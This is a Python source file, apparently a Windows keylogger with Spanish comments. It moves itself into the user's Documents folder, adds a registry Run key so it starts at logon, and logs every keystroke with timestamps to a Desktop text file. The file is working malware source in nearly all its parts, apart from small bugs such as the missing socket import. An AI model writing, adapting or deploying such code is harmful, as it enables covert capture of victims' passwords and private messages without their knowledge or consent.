try:
    from pynput import keyboard   
    import os  ,  shutil , pathlib
    from datetime import datetime
    import winreg
except:
    os.system("pip install pynput")
    os.system("pip install pathlib")
    os.system("pip install shutil")
    os.system("pip install winreg")



def reinicio():
    try:
        nombres_del_equipo = os.getenv("USERNAME")
        p = pathlib.Path(__file__).absolute()
        

        ruta_opsolutas = f"C:\\Users\\{nombres_del_equipo}\\Documents\\{p.name}"# pone la ruta para que se gurde el kilooger ejempo
        shutil.move(f"{__file__}", ruta_opsolutas)
        program_path = ruta_opsolutas  # Reemplaza con la ruta de tu programa exe
        nombre_del_equipos = os.getenv("USERNAME")

        keyy = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(keyy, f"{nombre_del_equipos}", 0, winreg.REG_SZ, program_path)
        winreg.CloseKey(keyy)
    except:
        pass
        
 
def prisionaero(key):
    try:
        nombre_del_equipo = os.getenv("USERNAME")
        hora = datetime.now()
        texto = hora.strftime("%B  %d/%m/%Y  %H:%M  TOSIX ATOMIX955")
        txt = open(f"C:\\Users\\{nombre_del_equipo}\\Desktop\\systema.txt","a")#tenes que cambiar la ruta no te olvides de eso

        if key == keyboard.Key.f4:
            return False

        elif key == keyboard.Key.space:
            txt.write(" ")

        elif key == keyboard.Key.backspace:
            pass    

        elif key == keyboard.Key.enter:
            txt.write("\n" + "\n")
            txt.write("   " + texto)
            txt.write("\n" + "\n")

        txt.write(str(key.char))
        

    except AttributeError:
        print()



if __name__ == '__main__':
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   
    s.settimeout(5)
    try:
        s.connect(("www.google.com", 80))
    except (socket.gaierror, socket.timeout):

        texto = open("Internet.txt","w")
        texto.write("Sin conexión a internet..")

    else:
        reinicio()
        with keyboard.Listener(on_press=prisionaero) as comienzo:
            comienzo.join()
        s.close()
